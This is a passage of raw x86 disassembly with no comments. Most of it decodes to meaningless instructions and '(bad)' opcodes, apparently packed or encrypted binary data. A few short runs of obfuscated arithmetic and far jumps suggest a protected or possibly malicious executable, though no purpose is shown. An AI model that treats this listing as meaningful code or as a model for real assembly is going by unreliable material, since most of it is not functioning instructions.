  40cf93:	sub    esp,DWORD PTR ds:0x7ca3b1b3
  40cf99:	inc    esp
  40cf9a:	aam    0x95
  40cf9c:	test   DWORD PTR [esi],esp
  40cf9e:	bound  esi,QWORD PTR [ebp-0x7fb6bf54]
  40cfa4:	enter  0x32c4,0x77
  40cfa8:	rep lods al,BYTE PTR ds:[esi]
  40cfaa:	cmp    bl,BYTE PTR [eax+0x74]
  40cfad:	add    BYTE PTR [eax+0x49f26bef],0xb1
  40cfb4:	data16 cld 
  40cfb6:	add    eax,esi
  40cfb8:	stos   DWORD PTR es:[edi],eax
  40cfb9:	retf   
  40cfba:	mov    eax,0xde91bcb3
  40cfbf:	cli    
  40cfc0:	stc    
  40cfc1:	xchg   DWORD PTR [edx],eax
  40cfc3:	pop    edi
  40cfc4:	and    bl,BYTE PTR [edi+0x3228c1a7]
  40cfca:	ret    0xaa01
  40cfcd:	push   ebp
  40cfce:	hlt    
  40cfcf:	push   0xf5a01aad
  40cfd4:	lahf   
  40cfd5:	xchg   esi,eax
  40cfd6:	push   0x9c11caba
  40cfdb:	sbb    al,BYTE PTR [esi+0x28]
  40cfde:	cdq    
  40cfdf:	mov    eax,ds:0xecea174f
  40cfe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfe5:	pop    ebx
  40cfe6:	das    
  40cfe7:	mov    cl,0x5c
  40cfe9:	mov    ebx,0x32987e9e
  40cfee:	iret   
  40cfef:	jle    0x40d046
  40cff1:	outs   dx,DWORD PTR ds:[esi]
  40cff2:	js     0x40cfe7
  40cff4:	or     eax,0xb0809796
  40cff9:	add    eax,0xf74f0fb0
  40cffe:	and    edx,ecx
  40d000:	or     cl,al
  40d002:	stc    
  40d003:	adc    esp,DWORD PTR ds:0xfcbda7d3
  40d009:	mov    ebx,0x4ac3aaea
  40d00e:	lock in al,0x7b
  40d011:	pop    esp
  40d012:	ins    DWORD PTR es:[edi],dx
  40d013:	stos   BYTE PTR es:[edi],al
  40d014:	jp     0x40cfed
  40d016:	ins    DWORD PTR es:[edi],dx
  40d017:	arpl   WORD PTR [edi],ax
  40d019:	retf   
  40d01a:	add    DWORD PTR [edx+ecx*1-0x7c1138c8],esi
  40d021:	mov    dh,0x7
  40d023:	mov    BYTE PTR [ecx],bh
  40d025:	inc    edi
  40d026:	imul   edi,DWORD PTR [ebp+0x1694826d],0xffffffe9
  40d02d:	out    dx,eax
  40d02e:	hlt    
  40d02f:	jbe    0x40d085
  40d031:	arpl   WORD PTR [edi],dx
  40d033:	jl     0x40cfee
  40d035:	dec    edx
  40d036:	lock cli 
  40d038:	fxch   st(5)
  40d03a:	xchg   BYTE PTR [ebp+0x13],bh
  40d03d:	ret    0xd108
  40d040:	jecxz  0x40d0b5
  40d042:	ret    0xc4b7
  40d045:	pop    esp
  40d046:	pop    ecx
  40d047:	les    ecx,FWORD PTR [ebp+0x3b]
  40d04a:	pop    edx
  40d04b:	sub    DWORD PTR [eax+0x5d],ebx
  40d04e:	inc    ebx
  40d04f:	stc    
  40d050:	call   0xea221d1
  40d055:	lods   al,BYTE PTR ds:[esi]
  40d056:	repnz stos DWORD PTR es:[edi],eax
  40d058:	add    eax,DWORD PTR [esi+0x61]
  40d05b:	pop    edx
  40d05c:	in     al,0x8b
  40d05e:	sar    esi,1
  40d060:	retf   0xa53d
  40d063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d064:	inc    edi
  40d065:	and    DWORD PTR [eax],esi
  40d067:	(bad)  
  40d068:	cs sti 
  40d06a:	jae    0x40d0c1
  40d06c:	xor    eax,0xe07301b0
  40d071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d072:	cmp    al,0xb
  40d074:	add    dl,BYTE PTR [edx-0x23]
  40d077:	dec    ebx
  40d078:	in     eax,dx
  40d079:	rcl    BYTE PTR [ecx+0x77],cl
  40d07c:	inc    esi
  40d07d:	add    DWORD PTR [esi-0xa],0x46
  40d081:	test   al,0xaa
  40d083:	test   al,0x5e
  40d085:	jg     0x40d0fc
  40d087:	pop    ebx
  40d088:	loop   0x40d104
  40d08a:	mov    ah,0x3
  40d08c:	adc    DWORD PTR [edx-0x3e7e8f9f],eax
  40d092:	adc    eax,0x88ecdd4f
  40d097:	dec    edi
  40d098:	jae    0x40d096
  40d09a:	rcl    ebx,1
  40d09c:	retf   0xe72f
  40d09f:	pusha  
  40d0a0:	jmp    ebx
  40d0a2:	loopne 0x40d0b7
  40d0a4:	jnp    0x40d107
  40d0a6:	not    BYTE PTR [edi-0x1db78f54]
  40d0ac:	pop    ebp
  40d0ad:	btc    DWORD PTR [eax-0x911043],ecx
  40d0b4:	xor    DWORD PTR [edi-0x12113cc6],esp
  40d0ba:	mov    ds:0x70ac0273,eax
  40d0bf:	ds lods eax,DWORD PTR es:[esi]
  40d0c2:	pop    ebx
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebp,FWORD PTR [eax+0x41]
  40d0f0:	dec    edx
  40d0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d134
  40d0fb:	imul   ebx,DWORD PTR [esi-0x6f3ac3c6],0x1de3b852
  40d105:	mov    ds:0xa0f6694a,al
  40d10a:	int    0x79
  40d10c:	push   esi
  40d10d:	push   ebx
  40d10e:	adc    al,0xb2
  40d110:	dec    ebx
  40d111:	cmp    al,cl
  40d113:	mov    BYTE PTR ds:0x175aa01e,al
  40d119:	cmp    al,0x7b
  40d11b:	imul   esi,esi,0xffffffdb
  40d11e:	add    DWORD PTR [ebx-0x2d],0x3e
  40d122:	cli    
  40d123:	sub    eax,0x19207505
  40d128:	lds    esi,FWORD PTR [ecx+0x39]
  40d12b:	sub    esp,eax
  40d12d:	xor    BYTE PTR [ebp-0x6e],bl
  40d130:	out    0x19,eax
  40d132:	mov    DWORD PTR [ebx+0x9],ebp
  40d135:	jo     0x40d10a
  40d137:	or     esp,DWORD PTR [edx-0x65]
  40d13a:	loope  0x40d17c
  40d13c:	dec    ebp
  40d13d:	mov    edi,0xdfa05c7c
  40d142:	push   ebx
  40d143:	push   ds
  40d144:	jnp    0x40d185
  40d146:	fdiv   st,st(1)
  40d148:	js     0x40d1a8
  40d14a:	loope  0x40d1b6
  40d14c:	inc    esi
  40d14d:	pop    ecx
  40d14e:	dec    ebp
  40d14f:	cmp    al,0xdb
  40d151:	fsubr  st,st(3)
  40d153:	jge    0x40d18e
  40d155:	mov    dl,0x98
  40d157:	inc    eax
  40d158:	js     0x40d155
  40d15a:	mov    ecx,0xd477416c
  40d15f:	push   ds
  40d160:	(bad)  
  40d161:	fst    DWORD PTR ds:0x3a586828
  40d167:	jno    0x40d13c
  40d169:	adc    ah,BYTE PTR [eax]
  40d16b:	sub    ah,bl
  40d16d:	cmp    edx,DWORD PTR [eax-0x60]
  40d170:	sub    eax,0x3bb7c9b6
  40d175:	rcr    BYTE PTR [eax+0x56b65eaf],cl
  40d17b:	fist   WORD PTR [eax+edx*2]
  40d17e:	stos   BYTE PTR es:[edi],al
  40d17f:	add    dh,BYTE PTR [ecx+0x22cf66e5]
  40d185:	pop    ecx
  40d186:	pop    ebp
  40d187:	sbb    BYTE PTR [ebp+0x52737f25],ch
  40d18d:	adc    esi,DWORD PTR [ebp+0x7f]
  40d190:	sbb    eax,0x45a7fa50
  40d195:	(bad)  
  40d197:	push   ebx
  40d198:	les    eax,FWORD PTR [edx]
  40d19a:	pop    ecx
  40d19b:	pop    es
  40d19c:	and    al,0xec
  40d19e:	pop    ss
  40d19f:	in     al,0xc4
  40d1a1:	ror    DWORD PTR [esi],cl
  40d1a3:	ins    DWORD PTR es:[edi],dx
  40d1a4:	mov    bh,0x37
  40d1a6:	add    eax,0x8d3a556
  40d1ab:	or     BYTE PTR [eax-0x6f3ba55e],ah
  40d1b1:	(bad)  
  40d1b2:	in     al,dx
  40d1b3:	addr16 mov al,0x3a
  40d1b6:	jae    0x40d154
  40d1b8:	xor    al,0x99
  40d1ba:	jmp    0x6470e2
  40d1bf:	icebp  
  40d1c0:	icebp  
  40d1c1:	or     dl,BYTE PTR [ecx+0x8]
  40d1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1c5:	lock pop eax
  40d1c7:	inc    ebp
  40d1c8:	inc    esi
  40d1c9:	fnstenv [eax]
  40d1cb:	push   edi
  40d1cc:	std    
  40d1cd:	mov    eax,ds:0xb779da9c
  40d1d2:	jmp    0x5979013
  40d1d7:	or     eax,DWORD PTR [edi+ecx*2-0x7a83c17b]
  40d1de:	(bad)  
  40d1df:	cs pop ecx
  40d1e1:	pop    esi
  40d1e2:	and    eax,0x93d9ebdd
  40d1e7:	mov    cl,0xdc
  40d1e9:	shl    BYTE PTR [edi+ecx*8],1
  40d1ec:	xor    esp,DWORD PTR [ecx+0xfaacee0]
  40d1f2:	jnp    0x40d1f8
  40d1f4:	mov    edi,0x2e530633
  40d1f9:	jecxz  0x40d1ae
  40d1fb:	dec    ebp
  40d1fc:	dec    ebx
  40d1fd:	aad    0xa4
  40d1ff:	pusha  
  40d200:	pop    eax
  40d201:	cdq    
  40d202:	xchg   ecx,eax
  40d203:	mov    al,ds:0xe2608a86
  40d208:	sub    ch,ah
  40d20a:	test   al,0xec
  40d20c:	inc    ebp
  40d20d:	mov    al,0x2d
  40d20f:	test   BYTE PTR [ecx+0x44892128],dh
  40d215:	mov    edi,0x6edcff14
  40d21a:	mov    ds:0x8c2d3bda,al
  40d21f:	pushf  
  40d220:	das    
  40d221:	jge    0x40d1dd
  40d223:	adc    al,0x52
  40d225:	aas    
  40d226:	out    dx,al
  40d227:	iret   
  40d228:	add    DWORD PTR [esi],0xfa53f1e2
  40d22e:	cdq    
  40d22f:	enter  0xdc3f,0xda
  40d233:	ffreep st(7)
  40d235:	mov    eax,ds:0x9ffcf47b
  40d23a:	stos   DWORD PTR es:[edi],eax
  40d23b:	daa    
  40d23c:	mov    dh,0x4b
  40d23e:	mov    bh,BYTE PTR [edi-0x75c868f1]
  40d244:	cmp    DWORD PTR [ecx],eax
  40d246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d247:	xchg   esi,eax
  40d248:	int    0x3
  40d24a:	mov    cl,0x7f
  40d24c:	add    BYTE PTR [edi+edi*4+0x2d4ded98],0x4b
  40d254:	jne    0x40d1fb
  40d256:	ret    0x842e
  40d259:	xor    al,0xc5
  40d25b:	mov    ebp,0xbd15a90f
  40d260:	fadd   st,st(5)
  40d262:	lock cs jns 0x40d279
  40d266:	mov    ds:0xf3674991,eax
  40d26b:	(bad)  
  40d26c:	mov    ebx,DWORD PTR [esi-0x64]
  40d26f:	scas   al,BYTE PTR es:[edi]
  40d270:	out    dx,al
  40d271:	mov    ebp,0x4919b4cf
  40d276:	adc    eax,DWORD PTR [ebx]
  40d278:	jb     0x40d20f
  40d27a:	in     al,0xcc
  40d27c:	jecxz  0x40d266
  40d27e:	mov    eax,0x40120701
  40d283:	fidiv  WORD PTR [ebx-0x18863099]
  40d289:	rcr    edx,0xab
  40d28c:	and    eax,0x24e95305
  40d291:	xlat   BYTE PTR ds:[ebx]
  40d292:	add    bl,BYTE PTR [esi+edi*2-0x5a]
  40d296:	mov    dl,0x33
  40d298:	sub    al,0x30
  40d29a:	cmp    ebp,DWORD PTR [eax-0x35]
  40d29d:	sub    edi,DWORD PTR [eax+0x4e]
  40d2a0:	cmp    BYTE PTR [esi+0x1ccc66ea],0xca
  40d2a7:	addr16 adc esi,ebp
  40d2aa:	enter  0x2a0f,0x22
  40d2ae:	push   0xffffffec
  40d2b0:	(bad)  
  40d2b2:	jmp    0x40d2e7
  40d2b4:	in     eax,0x35
  40d2b6:	mov    edi,0xfdc0c98e
  40d2bb:	xor    BYTE PTR [esi],0xb0
  40d2be:	push   ss
  40d2bf:	inc    ebp
  40d2c0:	adc    al,0x11
  40d2c2:	mov    esi,0xdb9cb725
  40d2c7:	fs addr16 (bad) 
  40d2ca:	dec    dl
  40d2cc:	push   cs
  40d2cd:	xchg   ebp,eax
  40d2ce:	(bad)  
  40d2cf:	xchg   edi,eax
  40d2d0:	xchg   BYTE PTR [ecx+0x6f],dh
  40d2d3:	loopne 0x40d2bb
  40d2d5:	les    esp,FWORD PTR [edi-0x2661fb6c]
  40d2db:	jmp    0x6288e689
  40d2e0:	cmp    cl,cl
  40d2e2:	(bad)  [esi]
  40d2e4:	sti    
  40d2e5:	and    DWORD PTR [esp+ebx*2],ecx
  40d2e8:	mov    DWORD PTR [edi+0x58dd618c],eax
  40d2ee:	mov    esi,0xecbb4259
  40d2f3:	jno    0x40d2d3
  40d2f5:	add    eax,0x7f11119b
  40d2fa:	push   esp
  40d2fb:	push   0xab20d44a
  40d300:	push   ebp
  40d301:	adc    BYTE PTR [eax+0x7351a0c0],0x77
  40d308:	or     eax,0xa9d03ab5
  40d30d:	xor    dh,BYTE PTR [eax]
  40d30f:	(bad)  
  40d310:	mov    al,0xbe
  40d312:	pop    es
  40d313:	jbe    0x40d2a8
  40d315:	adc    cl,BYTE PTR [ebx+ebx*1-0x6]
  40d319:	neg    BYTE PTR [eax]
  40d31b:	bnd jbe 0x40d30c
  40d31e:	and    al,0xed
  40d320:	or     al,0x14
  40d322:	inc    ebx
  40d323:	sahf   
  40d324:	mov    edi,0xc16ca395
  40d329:	mov    WORD PTR [eax+0x77bc159],ds
  40d32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d330:	sbb    al,0x34
  40d332:	mov    ecx,0x36aa40e8
  40d337:	and    ebx,DWORD PTR [esi]
  40d339:	cmp    eax,0xe115baee
  40d33e:	pop    ss
  40d33f:	adc    BYTE PTR [ebx],dh
  40d341:	pop    ebx
  40d342:	les    esp,FWORD PTR [edx-0x267ec5f6]
  40d348:	in     eax,0xf4
  40d34a:	mov    WORD PTR [ebx-0x623d7619],?
  40d350:	fild   DWORD PTR [edx+0x6ac9ad00]
  40d356:	mov    ah,0xd7
  40d358:	bound  ebx,QWORD PTR [edi*2-0x552685cf]
  40d35f:	or     BYTE PTR [ebx],ah
  40d361:	aaa    
  40d362:	daa    
  40d363:	mov    cl,0x16
  40d365:	shl    ecx,1
  40d367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d368:	pushf  
  40d369:	mov    edx,0x5f961e81
  40d36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36f:	jno    0x40d343
  40d371:	stos   DWORD PTR es:[edi],eax
  40d372:	rcr    BYTE PTR [ecx-0x20],cl
  40d375:	arpl   WORD PTR ds:0xdff93d52,si
  40d37b:	add    eax,0xa3070cf7
  40d380:	inc    edi
  40d381:	push   esp
  40d382:	out    0x69,al
  40d384:	es into 
  40d386:	cli    
  40d387:	mov    bl,0xa9
  40d389:	ins    DWORD PTR es:[edi],dx
  40d38a:	ficomp DWORD PTR [esi]
  40d38c:	cld    
  40d38d:	cdq    
  40d38e:	fisub  DWORD PTR [esi]
  40d390:	push   ds
  40d391:	jecxz  0x40d3db
  40d393:	pop    es
  40d394:	out    0xab,eax
  40d396:	out    0xdb,al
  40d398:	fnstcw WORD PTR [edi+0x19a93235]
  40d39e:	jmp    0xd4ac14a
  40d3a3:	fbld   TBYTE PTR [esp+edx*1+0x8d5ccf7]
  40d3aa:	out    dx,eax
  40d3ab:	iret   
  40d3ac:	sub    DWORD PTR [eax+ebx*8],ecx
  40d3af:	sub    esi,DWORD PTR [ebx]
  40d3b1:	lods   eax,DWORD PTR ds:[esi]
  40d3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3b3:	mov    ebp,0xee1b088b
  40d3b8:	pop    ds
  40d3b9:	je     0x40d3f8
  40d3bb:	and    al,0xe1
  40d3bd:	out    0x2f,eax
  40d3bf:	push   ecx
  40d3c0:	mov    eax,0x2dd8c4e3
  40d3c5:	or     DWORD PTR [ebp-0x52c9ee48],edx
  40d3cb:	jo     0x40d42b
  40d3cd:	add    edi,DWORD PTR [ecx-0xdd89af]
  40d3d3:	stos   BYTE PTR es:[edi],al
  40d3d4:	cmp    eax,0x3f9d2907
  40d3d9:	retf   
  40d3da:	xlat   BYTE PTR ds:[ebx]
  40d3db:	dec    edi
  40d3dc:	mov    gs,WORD PTR [ebx+0x57]
  40d3df:	mov    dl,0xe1
  40d3e1:	call   DWORD PTR [ecx+ebx*2-0x3]
  40d3e5:	icebp  
  40d3e6:	mov    BYTE PTR [esi+edi*4-0x596a6eab],al
  40d3ed:	popf   
  40d3ee:	push   0xffffffac
  40d3f0:	and    eax,0xf8445ab0
  40d3f5:	int3   
  40d3f6:	ret    0x7fdc
  40d3f9:	adc    BYTE PTR [edx+0x3257d55],bh
  40d3ff:	mov    ah,0x8a
  40d401:	mov    esi,0xb254713b
  40d406:	pusha  
  40d407:	pop    edx
  40d408:	cs call 0xb5c37ddc
  40d40e:	xchg   ecx,eax
  40d40f:	stc    
  40d410:	mov    ebx,0xfc5d8862
  40d415:	mov    dl,0x4c
  40d417:	xchg   esi,eax
  40d418:	push   edx
  40d419:	loop   0x40d39d
  40d41b:	stos   BYTE PTR es:[edi],al
  40d41c:	jecxz  0x40d3c4
  40d41e:	cwde   
  40d41f:	lds    ebp,FWORD PTR [eax+0xa]
  40d422:	sbb    DWORD PTR [eax-0x38],ebp
  40d425:	pop    edx
  40d426:	and    ecx,ebp
  40d428:	sahf   
  40d429:	adc    al,0xab
  40d42b:	mov    gs,WORD PTR [ecx+0x4d]
  40d42e:	icebp  
  40d42f:	dec    ebp
  40d430:	ret    0xc1f7
  40d433:	jne    0x40d42c
  40d435:	cld    
  40d436:	pop    ecx
  40d437:	in     eax,dx
  40d438:	ins    DWORD PTR es:[edi],dx
  40d439:	in     al,dx
  40d43a:	mov    dh,0xe2
  40d43c:	add    eax,ebx
  40d43e:	leave  
  40d43f:	icebp  
  40d440:	lods   al,BYTE PTR ds:[esi]
  40d441:	dec    eax
  40d442:	inc    edi
  40d443:	inc    esp
  40d444:	pop    es
  40d445:	add    DWORD PTR [ecx+edx*1],esp
  40d448:	scas   al,BYTE PTR es:[edi]
  40d449:	mov    ebx,0xdf3a48dd
  40d44e:	mov    ebp,0xdc31b5ba
  40d453:	mov    dl,0xd9
  40d455:	mov    ch,BYTE PTR [ebx+eiz*4+0x77051cec]
  40d45c:	jl     0x40d4d9
  40d45e:	dec    edi
  40d45f:	pusha  
  40d460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d461:	(bad)  
  40d462:	mov    ds:0xb203a488,eax
  40d467:	sbb    ah,0x8d
  40d46a:	sbb    al,ah
  40d46c:	outs   dx,BYTE PTR ds:[esi]
  40d46d:	mov    esi,0x297aa4ae
  40d472:	sub    eax,0x9f981305
  40d477:	push   edi
  40d478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47a:	pushf  
  40d47b:	test   DWORD PTR [ebx+0x2717452d],esi
  40d481:	jmp    0x40d43e
  40d483:	jbe    0x40d4b5
  40d485:	mov    ah,0x3a
  40d487:	call   0xba0e2832
  40d48c:	and    DWORD PTR [ecx],esi
  40d48e:	xor    bh,bh
  40d490:	lds    esp,FWORD PTR [ecx]
  40d492:	lahf   
  40d493:	or     ah,al
  40d495:	adc    eax,0x294fdaf0
  40d49a:	mov    dh,0x8b
  40d49c:	jge    0x40d496
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xbcd3:0xb81a1d63
  40d4c6:	adc    eax,0x99c95a3b
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d456
  40d4d2:	dec    al
  40d4d4:	sahf   
  40d4d5:	addr16 pop edi
  40d4d7:	mov    al,ds:0xe03c054e
  40d4dc:	cmp    DWORD PTR [ecx+0x1dfe2a35],esp
  40d4e2:	call   0x7acf:0x6688f7f2
  40d4e9:	xchg   BYTE PTR [edi-0x4e30fd4f],al
  40d4ef:	lds    ecx,FWORD PTR [ebx-0x2f]
  40d4f2:	lahf   
  40d4f3:	ret    
  40d4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4f5:	mov    esp,0x5ed47d9c
  40d4fa:	cld    
  40d4fb:	or     ecx,0x54
  40d4fe:	fwait
  40d4ff:	mov    BYTE PTR [ecx-0x178868e9],bl
  40d505:	test   eax,0xe7acf491
  40d50a:	js     0x40d4e1
  40d50c:	add    ch,BYTE PTR [esi-0x6ae3ef6f]
  40d512:	mov    ebx,0xca311ec3
  40d517:	push   ebx
  40d518:	jmp    0xe49e:0x1c91afc8
  40d51f:	and    ch,al
  40d521:	mov    eax,0xcda6f9d0
  40d526:	fcom   st(6)
  40d528:	adc    BYTE PTR [edx+0x52],bl
  40d52b:	inc    edx
  40d52c:	or     ecx,DWORD PTR ds:0xdb45b647
  40d532:	push   ss
  40d533:	test   al,0x25
  40d535:	cld    
  40d536:	imul   esp,DWORD PTR [edi+esi*1-0x45],0x3b
  40d53b:	mov    ds,WORD PTR [ecx]
  40d53d:	or     ebp,0x4191b881
  40d543:	inc    esp
  40d544:	cld    
  40d545:	xchg   esi,eax
  40d546:	push   esp
  40d547:	mov    edi,0x4e588e37
  40d54c:	bound  ebx,QWORD PTR [esi-0x4d]
  40d54f:	mov    dl,BYTE PTR [esi+0x47]
  40d552:	or     bl,BYTE PTR [esi-0x54]
  40d555:	mov    al,dh
  40d557:	or     ah,ah
  40d559:	dec    ebp
  40d55a:	xchg   ebx,eax
  40d55b:	fnsave [eax+0x4cac7445]
  40d561:	add    eax,DWORD PTR [ebp-0x5d8c0f3c]
  40d567:	retf   
  40d568:	ret    
  40d569:	icebp  
  40d56a:	and    al,0xf6
  40d56c:	test   DWORD PTR [edi+0x6eeaed48],ebx
  40d572:	inc    edi
  40d573:	mov    bh,0x39
  40d575:	inc    eax
  40d576:	(bad)  
  40d577:	jmp    0x9c83e281
  40d57c:	jo     0x40d5e6
  40d57e:	mov    esp,0x9101612e
  40d583:	inc    ebp
  40d584:	pop    ss
  40d585:	aam    0x5e
  40d587:	dec    edi
  40d588:	jno    0x40d52b
  40d58a:	add    BYTE PTR [eax],bl
  40d58c:	retf   0xf408
  40d58f:	sbb    DWORD PTR [edx+0x64e6b0a4],ebx
  40d595:	jo     0x40d591
  40d597:	pusha  
  40d598:	dec    esp
  40d599:	adc    edx,DWORD PTR [eax-0x75ed319c]
  40d59f:	inc    esp
  40d5a0:	fild   WORD PTR [ebx-0x66]
  40d5a3:	js     0x40d5dc
  40d5a5:	pop    es
  40d5a6:	sbb    al,0x47
  40d5a8:	jge    0x40d54b
  40d5aa:	lea    ebp,[eax]
  40d5ac:	cli    
  40d5ad:	neg    bl
  40d5af:	adc    ecx,DWORD PTR [edi]
  40d5b1:	adc    ebp,DWORD PTR [ebp-0x2d]
  40d5b4:	pop    edi
  40d5b5:	sahf   
  40d5b6:	adc    eax,0x4afd63d4
  40d5bb:	fimul  WORD PTR [ecx]
  40d5bd:	ins    BYTE PTR es:[edi],dx
  40d5be:	icebp  
  40d5bf:	std    
  40d5c0:	push   ebx
  40d5c1:	icebp  
  40d5c2:	wbinvd 
  40d5c4:	or     BYTE PTR [ebx-0x54],cl
  40d5c7:	jo     0x40d61d
  40d5c9:	into   
  40d5ca:	mov    ch,0xd4
  40d5cc:	int    0x64
  40d5ce:	aad    0x60
  40d5d0:	dec    esi
  40d5d1:	outs   dx,BYTE PTR ds:[esi]
  40d5d2:	scas   al,BYTE PTR es:[edi]
  40d5d3:	xor    al,0xc7
  40d5d5:	push   ecx
  40d5d6:	xchg   ebp,eax
  40d5d7:	inc    ebp
  40d5d8:	cmp    bh,BYTE PTR [edi-0x59]
  40d5db:	and    al,0xd8
  40d5dd:	jle    0x40d61f
  40d5df:	ret    
  40d5e0:	and    BYTE PTR [edx+0xa6c678f],ch
  40d5e6:	pop    edi
  40d5e7:	hlt    
  40d5e8:	cmp    al,0x2b
  40d5ea:	je     0x40d634
  40d5ec:	gs rol ebp,1
  40d5ef:	cwde   
  40d5f0:	sbb    DWORD PTR [ebp+0x5f],esi
  40d5f3:	dec    edi
  40d5f4:	mov    dh,0x70
  40d5f6:	sar    ebx,0x31
  40d5f9:	cdq    
  40d5fa:	cmp    DWORD PTR [eax],edx
  40d5fc:	into   
  40d5fd:	pop    edx
  40d5fe:	out    0xc8,al
  40d600:	pop    ecx
  40d601:	popf   
  40d602:	loopne 0x40d5a1
  40d604:	inc    esp
  40d605:	mov    cs:0x6976d15e,al
  40d60b:	mov    esi,0xd5fa9ead
  40d610:	mov    esi,DWORD PTR [ebx]
  40d612:	es sub al,0x5
  40d615:	icebp  
  40d616:	push   es
  40d617:	dec    esp
  40d618:	call   0x23ef:0x76a60f4b
  40d61f:	sub    al,0xb4
  40d621:	pop    ecx
  40d622:	fidiv  DWORD PTR [ecx]
  40d624:	popa   
  40d625:	or     dh,ch
  40d627:	mov    DWORD PTR ds:[eax+0x60],edi
  40d62b:	xor    BYTE PTR [ebx+0x47],ch
  40d62e:	fidiv  DWORD PTR [ebp+0x50]
  40d631:	call   0x101d:0x134b22ef
  40d638:	sbb    eax,edx
  40d63a:	sahf   
  40d63b:	push   esi
  40d63c:	mov    bl,0x4b
  40d63e:	pushf  
  40d63f:	cli    
  40d640:	jmp    0x40d640
  40d642:	jp     0x40d677
  40d644:	fwait
  40d645:	out    0xc9,al
  40d647:	test   ax,0xa47
  40d64b:	adc    al,BYTE PTR [ecx]
  40d64d:	jae    0x40d5ef
  40d64f:	xchg   BYTE PTR [ebx-0x75],dl
  40d652:	ficom  DWORD PTR [edi+0x24]
  40d655:	sub    al,0x30
  40d657:	xlat   BYTE PTR ds:[ebx]
  40d658:	xor    cl,bl
  40d65a:	jb     0x40d619
  40d65c:	xor    al,0xf4
  40d65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d65f:	lods   al,BYTE PTR ds:[esi]
  40d660:	xchg   ebx,eax
  40d661:	mov    ecx,0xd1ce582a
  40d666:	or     DWORD PTR [ebx+0x67e79070],edx
  40d66c:	lock into 
  40d66e:	xchg   esi,eax
  40d66f:	jecxz  0x40d630
  40d671:	mov    edx,0x72ab27f0
  40d676:	cmp    BYTE PTR [edx],cl
  40d678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d679:	pop    ebx
  40d67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d67b:	rcr    ebx,cl
  40d67d:	push   esi
  40d67e:	push   esi
  40d67f:	cmp    DWORD PTR [edi-0x15f114f0],esp
  40d685:	call   0x1eb8:0x88dbb31c
  40d68c:	jnp    0x40d703
  40d68e:	sbb    al,0xdd
  40d690:	addr16 push eax
  40d692:	les    esp,FWORD PTR [ecx]
  40d694:	inc    ebx
  40d695:	add    al,0x28
  40d697:	mov    ah,0x2d
  40d699:	loope  0x40d678
  40d69b:	stc    
  40d69c:	(bad)  
  40d69d:	mov    edi,0x5aaa46e4
  40d6a2:	push   eax
  40d6a3:	xor    eax,0x8cc1807d
  40d6a8:	or     eax,0xeb9fa00b
  40d6ad:	test   eax,0xe5e51972
  40d6b2:	mov    ebp,0xcdb11283
  40d6b7:	pop    esi
  40d6b8:	dec    esi
  40d6b9:	or     al,0xc8
  40d6bb:	or     dh,BYTE PTR [edx+0x7aee8c1e]
  40d6c1:	mov    edi,edx
  40d6c3:	arpl   WORD PTR [esi+0x6f83285c],dx
  40d6c9:	(bad)  
  40d6ca:	cwde   
  40d6cb:	mov    edx,0xd46f943c
  40d6d0:	push   ebp
  40d6d1:	(bad)  
  40d6d2:	imul   esi,DWORD PTR [edi+eiz*8-0x52],0x8554278f
  40d6da:	les    esp,FWORD PTR [edx]
  40d6dc:	mov    ss,WORD PTR [esi+0x17]
  40d6df:	sub    al,0x2c
  40d6e1:	aaa    
  40d6e2:	pushf  
  40d6e3:	xchg   cl,bl
  40d6e5:	inc    edi
  40d6e6:	retf   
  40d6e7:	iret   
  40d6e8:	jns    0x40d69b
  40d6ea:	sti    
  40d6eb:	fnsave [eax-0x7c425089]
  40d6f1:	iret   
  40d6f2:	out    0xd0,eax
  40d6f4:	fcmove st,st(4)
  40d6f6:	(bad)  
  40d6f7:	mov    edx,0x5ef70f3a
  40d6fc:	adc    eax,0x3807e672
  40d701:	inc    edi
  40d702:	gs or  ah,ah
  40d705:	icebp  
  40d706:	call   0xc9fb3dc4
  40d70b:	cmp    ebp,esp
  40d70d:	xor    BYTE PTR [edi+0x77e650f0],ah
  40d713:	xchg   edx,eax
  40d714:	ss sti 
